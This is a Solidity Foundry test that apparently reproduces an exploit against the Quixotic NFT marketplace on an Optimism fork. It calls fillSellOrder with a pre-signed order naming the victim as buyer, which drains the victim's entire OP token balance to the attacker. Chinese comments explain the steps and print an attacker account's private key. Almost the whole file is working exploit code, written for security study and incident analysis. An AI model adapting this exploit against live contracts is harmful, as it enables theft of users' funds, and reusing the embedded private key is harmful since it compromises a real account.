pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";
import "./NFTContract.sol";

//https://www.levi104.com/categories/08-PoC/

contract Attacker is Test {

    NFTContract public nftHelper;
    IQuixotic public quixotic = IQuixotic(address(0x065e8A87b8F11aED6fAcf9447aBe5E8C5D7502b6));
    IERC20 public op = IERC20(0x4200000000000000000000000000000000000042);

    // 这里我们用到Narya的账户attacker：
    // address：0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e
    // private key: 0x97154a62cd5641a577e092d2eee7e39fcb3333dc595371a4303417dae0c2c006
    address public attacker = 0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e;
    address public victim = 0x4D9618239044A2aB2581f0Cc954D28873AFA4D7B;

     function setUp() public {
        vm.createSelectFork("optimism", 13_591_382);
        nftHelper = new NFTContract(); // 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
        vm.label(address(nftHelper), "nftHelper");
        vm.label(address(quixotic), "quixotic");
        vm.label(address(op), "op");
    }

    function test_Exploit() public {

        uint256 beforeAttack = op.balanceOf(attacker);
        emit log_named_uint("[Before] attacker OP Balance:", beforeAttack);

        vm.startBroadcast(attacker);
        uint256 victimBalance = op.balanceOf(victim);

        quixotic.fillSellOrder(
            address(attacker), // seller
            address(nftHelper), // contractAddress
            uint256(1), // tokenId
            uint256(1), // startTime
            uint256(9999999999999999999999999999999999999999), // expiration
            uint256(victimBalance), // price, 黑客需要知道受害者拥有多少op，全部取走
            uint256(1), // quantity
            uint256(1), // createdAtBlockNumber
            address(0x4200000000000000000000000000000000000042), // paymentERC20
            // 这个签名需要到链下进行，计算过程放到了calSignature.sol中
            hex"f39b078814b22a5fc0a3afd98485786acd332e1cc1bd7bc349b98dffafeb431c626776d5a6df000c4650b6e6364fb4097ad71f02c2c46134154820a65f4f77781b", // signature
            address(victim) // buyer，受害者
        );

        vm.stopBroadcast();

        uint256 afterAttack = op.balanceOf(attacker);
        emit log_named_uint("[after] attacker OP Balance:", afterAttack);

        assert(afterAttack > beforeAttack);
    }
   
}